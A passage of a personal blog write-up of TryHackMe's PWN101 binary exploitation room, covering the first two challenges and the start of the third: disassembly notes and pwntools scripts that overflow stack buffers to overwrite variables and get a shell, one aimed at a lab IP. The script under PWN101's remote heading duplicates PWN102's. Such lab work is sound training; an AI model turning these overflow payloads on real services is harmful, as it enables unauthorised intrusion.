<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(TryHackMe) - PWN101" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="This is all about Binary Exploitation. As i haven’t done that in a while i thought it would be nice to go back to TryHackMe and do some challenges there. I can only recommend the PWN101 as it’s about the right level for a refresher but it expects some knowledge to already be there so beware. Choose another room if you feel lost!" /><meta property="og:description" content="This is all about Binary Exploitation. As i haven’t done that in a while i thought it would be nice to go back to TryHackMe and do some challenges there. I can only recommend the PWN101 as it’s about the right level for a refresher but it expects some knowledge to already be there so beware. Choose another room if you feel lost!" /><link rel="canonical" href="https://an9k0r.github.io/posts/THM_binexp_pwn101/" /><meta property="og:url" content="https://an9k0r.github.io/posts/THM_binexp_pwn101/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-26T09:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(TryHackMe) - PWN101" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"This is all about Binary Exploitation. As i haven’t done that in a while i thought it would be nice to go back to TryHackMe and do some challenges there. I can only recommend the PWN101 as it’s about the right level for a refresher but it expects some knowledge to already be there so beware. Choose another room if you feel lost!","headline":"(TryHackMe) - PWN101","dateModified":"2022-11-03T08:42:47+01:00","url":"https://an9k0r.github.io/posts/THM_binexp_pwn101/","datePublished":"2022-10-26T09:00:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/THM_binexp_pwn101/"},"@context":"https://schema.org"}</script><title>(TryHackMe) - PWN101 | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(TryHackMe) - PWN101</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/4bada98203bf1c5f6b6dc7b2ea8480cc8fa44360b26ea15eda997c64462b16c0.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(TryHackMe) - PWN101</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-10-26 09:00:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 26, 2022, 9:00 AM +0200" >Oct 26, 2022</em> </span> <span> Updated <em class="timeago" date="2022-11-03 08:42:47 +0100 " data-toggle="tooltip" data-placement="bottom" title="Thu, Nov 3, 2022, 8:42 AM +0100" >Nov 3, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4907 words"> <em>27 min</em> read</span></div></div></div><div class="post-content"><p>This is all about Binary Exploitation. As i haven’t done that in a while i thought it would be nice to go back to TryHackMe and do some challenges there. I can only recommend the <a href="https://tryhackme.com/room/pwn101">PWN101</a> as it’s about the right level for a refresher but it expects some knowledge to already be there so beware. Choose another room if you feel lost!</p><h1 id="toc">TOC</h1><ul><li><a href="#toc">TOC</a><li><a href="#pwn101pwn101---stack-bof---straight-to-system-shell">PWN101.pwn101 - Stack BOF - Straight to System Shell</a><ul><li><a href="#file">File</a><li><a href="#checksec">Checksec</a><li><a href="#disssasembly">Disssasembly</a><li><a href="#exploit-local">Exploit (local)</a><li><a href="#exploit-remote">Exploit (remote)</a></ul><li><a href="#pwn102---stack-bof---simple-execution-flow-change">PWN102 - Stack BOF - Simple Execution Flow Change</a><ul><li><a href="#file-1">File</a><li><a href="#checksec-1">Checksec</a><li><a href="#dissasembly-in-cutter">Dissasembly in cutter</a><li><a href="#exploit-local-1">Exploit (local)</a><li><a href="#exploit-remote-1">Exploit (Remote)</a></ul><li><a href="#pwn103---hijack-execution-flow-bof---ret2win">PWN103 - Hijack Execution Flow (BOF) - Ret2Win</a><ul><li><a href="#file-2">File</a><li><a href="#checksec-2">Checksec</a><li><a href="#analysis">Analysis</a><ul><li><a href="#main">Main</a><li><a href="#general">General</a><li><a href="#admins_only">Admins_only</a></ul><li><a href="#exploit-local-2">Exploit (local)</a><li><a href="#exploit-remote-2">Exploit (remote)</a></ul><li><a href="#pwn104---stack-bof---ret2shellcode">PWN104 - Stack BOF - Ret2Shellcode</a><ul><li><a href="#checksec-and-file-check">Checksec and File check</a><li><a href="#analysis-1">Analysis</a><li><a href="#exploit-local-3">Exploit (local)</a><li><a href="#exploit-remote-3">Exploit (remote)</a></ul><li><a href="#pwn105---integer-overflowunderflow">PWN105 - Integer Overflow/Underflow</a><ul><li><a href="#file-and-checksec">File and Checksec</a><li><a href="#analysis-2">Analysis</a><li><a href="#exploit">Exploit</a></ul><li><a href="#pwn106---format-string-vulnerability---reading-the-stack">PWN106 - Format String Vulnerability - Reading the Stack</a><ul><li><a href="#file-3">File</a><li><a href="#checksec-3">Checksec</a><li><a href="#dissasembly">Dissasembly</a><li><a href="#exploit-local-4">Exploit local</a><li><a href="#exploit-remote-4">Exploit Remote</a></ul><li><a href="#pwn107---format-string-vulnerability---pie-and-canary-bypass">PWN107 - Format String Vulnerability - PIE and Canary Bypass</a><ul><li><a href="#file-4">File</a><li><a href="#checksec-4">Checksec</a><li><a href="#analysis-3">Analysis</a><li><a href="#exploit---1st-part--format-string-vulnerability-leak">Exploit - 1st Part =&gt; Format String Vulnerability Leak</a><li><a href="#exploit---2nd-part--buffer-overflow">Exploit - 2nd Part = Buffer Overflow</a></ul><li><a href="#pwn108---format-string-vulnerability---got-overwrite">PWN108 - Format String Vulnerability - GOT Overwrite</a><ul><li><a href="#file-5">File</a><li><a href="#checksec-5">Checksec</a><li><a href="#finding-the-vulnerability-decompiler">Finding the vulnerability (Decompiler)</a><li><a href="#exploitation">Exploitation</a></ul><li><a href="#pwn109---stack-bof---ret2libc">PWN109 - Stack BOF - Ret2Libc</a><ul><li><a href="#file-and-checksec-1">File and Checksec</a><li><a href="#analysis-4">Analysis</a><ul><li><a href="#cutter-dissasembly">Cutter Dissasembly</a></ul><li><a href="#leaking-the-addresses-from-stack">Leaking the addresses from stack</a></ul><li><a href="#pwn110---todo">PWN110 - todo</a><li><a href="#radare2-cheatsheet">RADARE2 CheatSheet</a><li><a href="#random-scripts">Random Scripts</a><ul><li><a href="#leak-addresses---format-string-vuln">Leak addresses - format string vuln</a></ul></ul><h1 id="pwn101pwn101---stack-bof---straight-to-system-shell">PWN101.pwn101 - Stack BOF - Straight to System Shell</h1><blockquote><p>This should give you a start: ‘AAAAAAAAAAA’</p><p>Challenge is running on port <strong>9001</strong></p></blockquote><p>When we start the binary we see following text:</p><p><img data-src="/assets/images/6e1a9c31d0be98760f8130629358ba006c6b6cf39f6d9657c828c42d74bb076e.png" alt="picture 2" data-proofer-ignore></p><p>Binary asks for input and prints something after we press enter.</p><p><img data-src="/assets/images/dc049e888922e8dad5748e6357977f7f2d59bba3cb1b3d67b0fc031d4a745b27.png" alt="picture 3" data-proofer-ignore></p><p>If we enter longer string, we get dropped to a shell</p><p><img data-src="/assets/images/d150c2d62c8f37fdebbcdfbbe1ccace06d0f2e3e2ff97c55cd28849440ab1a83.png" alt="picture 4" data-proofer-ignore></p><h2 id="file">File<a href="#file" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>luka@yurei:~/Desktop/thm<span class="nv">$ </span>file pwn101.pwn101 
pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
</pre></table></code></div></div><p>Binary is <strong>dynamically linked</strong> and it’s <strong>not stripped</strong></p><h2 id="checksec">Checksec<a href="#checksec" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/3ba43034960ac4f0e22da9dbead4b966106503f33bea83563d8fb6dc8c27d48a.png" alt="picture 5" data-proofer-ignore></p><h2 id="disssasembly">Disssasembly<a href="#disssasembly" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/4714e8be86437be4443f3964465b9bd179d0faa3b3e6ca6ee371b5b4cffbcdf5.png" alt="picture 6" data-proofer-ignore></p><p>We have function <code class="language-plaintext highlighter-rouge">gets</code> which can get overflown buffer. Input comes from the variable <code class="language-plaintext highlighter-rouge">var char +s @ rbp-0x40</code>. With 40 bytes/characters we fill the buffer.</p><p>Right below we have compare function (an if statement): (<em>dissasembly view below!</em>)</p><p><img data-src="/assets/images/8f3ca7c676616a4a0370bcc4a20bc0c74a79ef516120977dbd3240b9f94423f8.png" alt="picture 7" data-proofer-ignore></p><p>To solve the lab, we just need to overwrite the <code class="language-plaintext highlighter-rouge">var_4h</code> or the <code class="language-plaintext highlighter-rouge">0x539</code> value which resides at <code class="language-plaintext highlighter-rouge">rbp-0x4</code>.</p><p><img data-src="/assets/images/29d3a56d2459893d36e44b4680ab55be4f320bfb226bfc37bbb95ae8130de708.png" alt="picture 8" data-proofer-ignore></p><p>As our stack starts growing at rbp-0x40 we need to add somewhere beetween (0x40-0x4) and additional 1-3 Bytes to overwrite the <code class="language-plaintext highlighter-rouge">var_4h</code>.</p><h2 id="exploit-local">Exploit (local)<a href="#exploit-local" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn101.pwn101'</span>

<span class="n">padding_needed</span> <span class="o">=</span> <span class="mh">0x40</span><span class="o">-</span><span class="mh">0x4</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="n">padding_needed</span>
<span class="n">junk</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">junk</span>

<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./pwn101.pwn101'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="s">'Type the required ingredients to make briyani:'</span><span class="p">)</span>

<span class="n">proc</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></table></code></div></div><p><img data-src="/assets/images/3f49bc0fc9e942f042dd255b88db994c2005c9ea68393d6131f31288f2ec0eb8.png" alt="picture 9" data-proofer-ignore></p><h2 id="exploit-remote">Exploit (remote)<a href="#exploit-remote" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn102.pwn102'</span>

<span class="n">padding_range</span> <span class="o">=</span> <span class="mh">0x70</span><span class="o">-</span><span class="mh">0x08</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="n">padding_range</span>

<span class="c1"># code = 0x0000c0d3 =&gt; \xd3\xc0\x00\x00
# coffee = 0x00c0ff33 =&gt; \x33\xff\xc0\x00
</span><span class="n">code</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xd3\xc0\x00\x00</span><span class="s">"</span>
<span class="n">coffee</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x33\xff\xc0\x00</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">coffee</span>

<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./pwn102.pwn102'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="s">'Am I right?'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">proc</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/images/c5e17fcb3ef0d9f2c1d49dbdd49aaf1d5566e3b35c19b8da824c214cbd55af98.png" alt="picture 10" data-proofer-ignore></p><p>Binary has been pwned</p><h1 id="pwn102---stack-bof---simple-execution-flow-change">PWN102 - Stack BOF - Simple Execution Flow Change</h1><blockquote><p>The challenge is running on port 9002</p></blockquote><p>Let’s download the binary and check it locally.</p><p>It’s again a simple authentication that expect text input from us</p><p><img data-src="/assets/images/003df1b581a89c05ab5020eb4986a4c9396a786fb8734ebf47423d37470f28ee.png" alt="picture 11" data-proofer-ignore></p><p>It’s not that simple to crash it as the binary in the PWN101 so we’re going to have a deeper look.</p><h2 id="file-1">File<a href="#file-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/37fb0b757972cad0da86881069b2f1dccc6f4d2b9e18916da0c750fa1fd4b585.png" alt="picture 12" data-proofer-ignore></p><p>Binary is dynamically linked and not stripped!</p><h2 id="checksec-1">Checksec<a href="#checksec-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/88c3319838283ab5a2511226b7ac3c24a98027a42584699b106749f48d146b56.png" alt="picture 13" data-proofer-ignore></p><h2 id="dissasembly-in-cutter">Dissasembly in cutter<a href="#dissasembly-in-cutter" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s load the binary into cutter and check the main function and start from there.</p><p><img data-src="/assets/images/c0b7dab7ed563560448a62ce4f41a107e787ba8f7b48724dc56fe9d812134ba7.png" alt="picture 14" data-proofer-ignore></p><p>We have 3 variables, 2 functions which are:</p><ul><li>setup<li>banner</ul><p>And there comes <code class="language-plaintext highlighter-rouge">printf</code> which might be interesting if any <strong>format string vulnerabilities</strong> are present. I’ll switch to Decompiler to have a better look.</p><p><img data-src="/assets/images/9a08cba0a20d9ad70f89c1e341e886d824c449d2107b973b6d84329537173945.png" alt="picture 15" data-proofer-ignore></p><p>As it can be seen above, the <code class="language-plaintext highlighter-rouge">printf</code> is just printing strings.</p><p>Our input get’s however loaded to <code class="language-plaintext highlighter-rouge">scanf</code>function, and there comes If statement into play.</p><p>First of all, scanf is vulnerable. I’ve loaded the breakpoint address from the if statement into GDB <code class="language-plaintext highlighter-rouge">b *main+148</code> and did notice that some pointers and stack was overflown.</p><p><img data-src="/assets/images/252177ee82286a891e1bcece39f071ec816b58d16aaa8eb972ada8c6a097b64c.png" alt="picture 16" data-proofer-ignore></p><p>Now onto the exploit.</p><p>Remember the variables:</p><ul><li>var_4h = 0xbadf00d<li>var_8h = 0xfee1dead</ul><p>Two subsequent IF statements want coffee and code:</p><ul><li>var_4h == 0x00c0ff33<li>var_8h == 0x0000c0d3</ul><p>If we calculate their positions, we can change the variables so we get that system call. We have c0f3 at ebp 0x70-0x8 and c0ff33 right afterwards (0x70-0x04).</p><h2 id="exploit-local-1">Exploit (local)<a href="#exploit-local-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn102.pwn102'</span>

<span class="n">padding_range</span> <span class="o">=</span> <span class="mh">0x70</span><span class="o">-</span><span class="mh">0x08</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="n">padding_range</span>

<span class="c1"># code = 0x0000c0d3 =&gt; \xd3\xc0\x00\x00
# coffee = 0x00c0ff33 =&gt; \x33\xff\xc0\x00
</span><span class="n">code</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xd3\xc0\x00\x00</span><span class="s">"</span>
<span class="n">coffee</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x33\xff\xc0\x00</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">coffee</span>

<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./pwn102.pwn102'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="s">'Am I right?'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">proc</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/images/ab981d4d0a19c06e62e285b7de1f1367974955898fe901ac193346f1c2b7c233.png" alt="picture 17" data-proofer-ignore></p><h2 id="exploit-remote-1">Exploit (Remote)<a href="#exploit-remote-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="s">'./pwn102.pwn102'</span>

<span class="n">padding_range</span> <span class="o">=</span> <span class="mh">0x70</span><span class="o">-</span><span class="mh">0x08</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41</span><span class="s">"</span><span class="o">*</span><span class="n">padding_range</span>

<span class="c1"># code = 0x0000c0d3 =&gt; \xd3\xc0\x00\x00
# coffee = 0x00c0ff33 =&gt; \x33\xff\xc0\x00
</span><span class="n">code</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xd3\xc0\x00\x00</span><span class="s">"</span>
<span class="n">coffee</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x33\xff\xc0\x00</span><span class="s">"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">coffee</span>

<span class="c1">#proc = process('./pwn102.pwn102')
</span><span class="n">proc</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'10.10.227.21'</span><span class="p">,</span><span class="mi">9002</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="s">'Am I right?'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">proc</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p><img data-src="/assets/images/e7d97cb456895668c07afd683e30f2225149ca4afbb3753ba71be3cae7cb7c5d.png" alt="picture 18" data-proofer-ignore></p><h1 id="pwn103---hijack-execution-flow-bof---ret2win">PWN103 - Hijack Execution Flow (BOF) - Ret2Win</h1><blockquote><p>The challenge is running on port 9003</p></blockquote><p>Simply by running the binary, we get a menu. While choosing <code class="language-plaintext highlighter-rouge">3) General</code> we get <code class="language-plaintext highlighter-rouge">Segmentation fault</code></p><p><img data-src="/assets/images/59b53b3195fa6e3503cfb0c5794bbb689d0af929afa2dbeb3c878f814a7cf1cc.png" alt="picture 19" data-proofer-ignore></p><h2 id="file-2">File<a href="#file-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
